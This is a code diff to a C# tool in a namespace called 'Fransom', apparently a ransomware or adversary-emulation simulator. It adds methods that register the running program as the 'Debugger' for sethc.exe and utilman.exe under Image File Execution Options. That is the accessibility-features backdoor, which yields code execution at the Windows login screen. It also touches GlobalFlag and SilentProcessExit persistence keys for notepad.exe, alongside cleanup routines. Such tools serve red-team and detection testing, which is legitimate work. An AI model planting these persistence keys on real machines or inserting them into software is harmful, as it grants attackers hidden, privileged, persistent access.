@@ -178,7 +178,7 @@ namespace Fransom
             {
                 string keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe";
                 string keyname = "GlobalFlag";
-                int keyvalue = 512; 
+                int keyvalue = 512;
                 RegistryKey regkey;
                 regkey = Registry.LocalMachine.CreateSubKey(keypath);
                 regkey.SetValue(keyname, keyvalue);
@@ -216,21 +216,94 @@ namespace Fransom
                 string keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe";
                 string keyname = "GlobalFlag";
                 RegistryKey regkey;
-                regkey = Registry.LocalMachine.OpenSubKey(keypath);
+                regkey = Registry.LocalMachine.OpenSubKey(keypath, true);
                 regkey.DeleteValue(keyname);
                 regkey.Close();
                 Logger.WriteLine(String.Format("[+] Cleaned up HKLM:{0} {1} key", keypath, keyname));
 
                 keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe";
                 keyname = "ReportingMode";
-                regkey = Registry.LocalMachine.OpenSubKey(keypath);
+                regkey = Registry.LocalMachine.OpenSubKey(keypath, true);
                 regkey.DeleteValue(keyname);
                 regkey.Close();
                 Logger.WriteLine(String.Format("[+] Cleaned up HKLM:{0} {1} key", keypath, keyname));
 
                 keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe";
                 keyname = "MonitorProcess";
-                regkey = Registry.LocalMachine.OpenSubKey(keypath);
+                regkey = Registry.LocalMachine.OpenSubKey(keypath, true);
+                regkey.DeleteValue(keyname);
+                regkey.Close();
+                Logger.WriteLine(String.Format("[+] Cleaned up HKLM:{0} {1} key", keypath, keyname));
+            }
+            catch (ArgumentException)
+            {
+                Logger.WriteLine("[-] Error: Selected Registry value does not exist");
+            }
+        }
+        public void CreateSethcIfeo()
+        {
+            try
+            {
+                string keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
+                string keyname = "Debugger";
+                string keyvalue = Assembly.GetEntryAssembly().Location;
+                RegistryKey regkey;
+                regkey = Registry.LocalMachine.CreateSubKey(keypath);
+                regkey.SetValue(keyname, keyvalue);
+                regkey.Close();
+                Logger.WriteLine(String.Format("[+] Created HKLM:{0} key '{1}' and set to {2}", keypath, keyname, keyvalue));
+            }
+            catch (Exception e)
+            {
+                Logger.WriteLine("[-] Error: " + e.Message);
+            }
+        }
+
+        public void RemoveSethcIfeo()
+        {
+            try
+            {
+                string keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
+                string keyname = "Debugger";
+                RegistryKey regkey;
+                regkey = Registry.LocalMachine.OpenSubKey(keypath, true);
+                regkey.DeleteValue(keyname);
+                regkey.Close();
+                Logger.WriteLine(String.Format("[+] Cleaned up HKLM:{0} {1} key", keypath, keyname));
+            }
+            catch (ArgumentException)
+            {
+                Logger.WriteLine("[-] Error: Selected Registry value does not exist");
+            }
+        }
+
+        public void CreateUtilmanIfeo()
+        {
+            try
+            {
+                string keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe";
+                string keyname = "Debugger";
+                string keyvalue = Assembly.GetEntryAssembly().Location;
+                RegistryKey regkey;
+                regkey = Registry.LocalMachine.CreateSubKey(keypath);
+                regkey.SetValue(keyname, keyvalue);
+                regkey.Close();
+                Logger.WriteLine(String.Format("[+] Created HKLM:{0} key '{1}' and set to {2}", keypath, keyname, keyvalue));
+            }
+            catch (Exception e)
+            {
+                Logger.WriteLine("[-] Error: " + e.Message);
+            }
+        }
+
+        public void RemoveUtilmanIfeo()
+        {
+            try
+            {
+                string keypath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe";
+                string keyname = "Debugger";
+                RegistryKey regkey;
+                regkey = Registry.LocalMachine.OpenSubKey(keypath, true);
                 regkey.DeleteValue(keyname);
                 regkey.Close();
                 Logger.WriteLine(String.Format("[+] Cleaned up HKLM:{0} {1} key", keypath, keyname));
